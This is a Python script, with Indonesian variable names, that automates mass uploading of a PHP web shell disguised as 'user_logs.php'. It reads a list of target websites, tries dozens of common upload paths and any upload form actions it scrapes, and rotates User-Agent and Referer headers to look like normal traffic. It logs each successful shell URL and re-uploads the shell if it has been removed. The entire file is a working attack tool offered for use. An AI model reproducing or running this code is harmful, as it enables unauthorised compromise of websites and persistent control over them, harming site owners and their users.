import requests, os, random, re, time

SHELL_FILE = 'user_logs.php'
SIMPAN_HASIL = 'hasil_upload.txt'
UA_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
]
REFERERS = [
    'https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/'
]

def fetch_html_paths(target):
    try:
        res = requests.get(target, timeout=10)
        if res.status_code == 200:
            paths = re.findall(r'action=[\"\']?([^"\'> ]+)', res.text)
            return [p for p in paths if 'upload' in p.lower()]
    except:
        pass
    return []

def coba_upload(target):
    headers = {
        'User-Agent': random.choice(UA_LIST),
        'Referer': random.choice(REFERERS)
    }
    shell_name = os.path.basename(SHELL_FILE)
    files = {
        'file': (shell_name, open(SHELL_FILE, 'rb'), 'application/octet-stream'),
        'upload': (shell_name, open(SHELL_FILE, 'rb'), 'application/octet-stream'),
    }

    static_paths = [
        "/upload",
        "/upload.php",
        "/upload.html",
        "/uploadfile",
        "/upload_file",
        "/upload_file.php",
        "/uploads",
        "/uploads/",
        "/uploads/upload.php",
        "/uploads/files/",
        "/uploads/images/",
        "/uploads/media/",
        "/uploads/docs/",
        "/uploads/temp/",
        "/uploads/public/",
        "/uploads/attachments/",
        "/uploads/data/",
        "/fileupload",
        "/fileupload.php",
        "/file_upload",
        "/file_upload.php",
        "/file-manager/upload.php",
        "/admin/upload.php",
        "/admin/uploads.php",
        "/admin/upload",
        "/admin/uploads",
        "/wp-content/uploads/",
        "/wp-content/themes/theme/upload.php",
        "/wp-admin/upload.php",
        "/administrator/components/com_media/",
        "/components/com_media/",
        "/media/upload.php",
        "/sites/default/files/",
        "/modules/upload/",
        "/storage/app/public/",
        "/storage/uploads/",
        "/resources/uploads/",
        "/assets/uploads/",
        "/public/uploads/",
        "/images/uploads/",
        "/static/uploads/",
        "/system/uploads/",
        "/public/upload/",
        "/api/upload/",
        "/uploads/api/",
        "/data/uploads/",
        "/docroot/uploads/",
        "/cgi-bin/upload.cgi",
        "/uploader.php",
        "/uploadhandler.php",
        "/engine/upload.php",
        "/site/upload",
        "/dashboard/uploads/",
        "/backend/upload.php",
        "/portal/upload.php",
    ]

    dynamic_paths = fetch_html_paths(target)
    all_paths = list(set(static_paths + dynamic_paths))

    for path in all_paths:
        url = path if path.startswith("http") else target.rstrip('/') + '/' + path.lstrip('/')
        for param_name, file_tuple in files.items():
            for attempt in range(3):
                try:
                    response = requests.post(url, files={param_name: file_tuple}, headers=headers, timeout=10)
                    if response.status_code in [200, 201] and shell_name in response.text:
                        shell_url = target.rstrip('/') + '/' + shell_name
                        print(f"[💀 SUCCESS] Shell uploaded: {shell_url}")
                        with open(SIMPAN_HASIL, "a") as f:
                            f.write(shell_url + "\n")
                        return True
                    else:
                        print(f"[✘ FAIL] {url} | param: {param_name} | try: {attempt+1}")
                except Exception as e:
                    print(f"[ERROR] {url} | param: {param_name} => {e}")
                time.sleep(1)
    return False

def fallback_restore(target):
    shell_url = target.rstrip('/') + '/user_logs.php'
    try:
        response = requests.get(shell_url)
        if response.status_code == 404:
            print(f"[⚠️ Fallback] Shell hilang, coba restore ke {target}")
            coba_upload(target)
    except:
        pass

def main():
    with open("targets.txt", "r") as f:
        targets = [line.strip() for line in f if line.strip()]
    for target in targets:
        print(f"[>] Scan target: {target}")
        success = coba_upload(target)
        if not success:
            fallback_restore(target)

if __name__ == "__main__":
    main()
